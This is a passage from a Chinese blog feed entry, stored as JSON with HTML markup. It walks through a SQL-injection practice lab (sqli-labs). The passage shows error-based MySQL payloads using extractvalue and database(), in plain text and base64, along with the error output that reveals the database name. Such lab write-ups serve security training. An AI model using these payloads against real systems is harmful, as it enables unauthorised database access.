extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哪到后面的 sql 语句，发现只需要闭合一个双引号，不需要），开干</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结</h2>\n<p>我发现 sqlmap 跑得有一点慢</p>\n",
            "tags": [
                "sql注入靶场"
            ]
        }
    ]
}